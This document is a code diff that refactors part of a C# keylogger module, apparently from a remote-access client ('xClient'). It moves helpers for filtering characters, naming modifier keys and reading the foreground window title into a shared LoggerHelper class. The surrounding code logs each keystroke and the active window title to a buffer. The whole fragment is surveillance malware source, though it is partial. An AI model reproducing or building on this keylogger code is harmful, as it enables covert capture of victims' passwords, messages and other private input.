@@ -92,7 +92,7 @@ namespace xClient.Core.Keylogger
 
         private void OnKeyDown(object sender, KeyEventArgs e) //Called first
         {
-            string activeWindowTitle = GetActiveWindowTitle(); //Get active thread window title
+            string activeWindowTitle = LoggerHelper.GetActiveWindowTitle(); //Get active thread window title
             if (!string.IsNullOrEmpty(activeWindowTitle))
             {
                 // Only write the title to the log file if the names are different.
@@ -165,49 +165,16 @@ namespace xClient.Core.Keylogger
             }
         }
 
-        private string Filter(char key)
-        {
-            switch (key)
-            {
-                case '<':
-                    return "&lt;";
-                case '>':
-                    return "&gt;";
-                case '#':
-                    return "&#35;";
-                case '&':
-                    return "&amp;";
-                case '"':
-                    return "&quot;";
-                case '\'':
-                    return "&apos;";
-                case ' ': // space is already proccessed by OnKeyDown
-                    return string.Empty;
-            }
-            return key.ToString();
-        }
-
         private void Logger_KeyPress(object sender, KeyPressEventArgs e) //Called second
         {
             //This method should be used to process all of our unicode characters
 
-            _logFileBuffer.Append(Filter(e.KeyChar));
+            _logFileBuffer.Append(LoggerHelper.Filter(e.KeyChar));
         }
 
         private void OnKeyUp(object sender, KeyEventArgs e) //Called third
         {
             _logFileBuffer.Append(HighlightSpecialKeys(_pressedKeys.ToArray()));
-        }
-
-        private string GetDisplayName(string key)
-        {
-            if (key.Contains("ControlKey"))
-                return "Control";
-            else if (key.Contains("Menu"))
-                return "Alt";
-            else if (key.Contains("Win"))
-                return "Win";
-            return key;
         }
 
         private string HighlightSpecialKeys(Keys[] keys)
@@ -217,7 +184,7 @@ namespace xClient.Core.Keylogger
             string[] names = new string[keys.Length];
             for (int i = 0; i < keys.Length; i++)
             {
-                names[i] = GetDisplayName(keys[i].ToString());
+                names[i] = LoggerHelper.GetDisplayName(keys[i].ToString());
             }
 
             if (_pressedKeys.Contains(Keys.LControlKey)
@@ -328,16 +295,5 @@ namespace xClient.Core.Keylogger
 
             _logFileBuffer = new StringBuilder();
         }
-
-        private string GetActiveWindowTitle()
-        {
-           StringBuilder sbTitle = new StringBuilder(1024);
-
-           WinApi.ThreadNativeMethods.GetWindowText(WinApi.ThreadNativeMethods.GetForegroundWindow(), sbTitle, sbTitle.Capacity);
-
-           string title = sbTitle.ToString();
-
-           return title != string.Empty ? title : null;
-       }
     }
 }
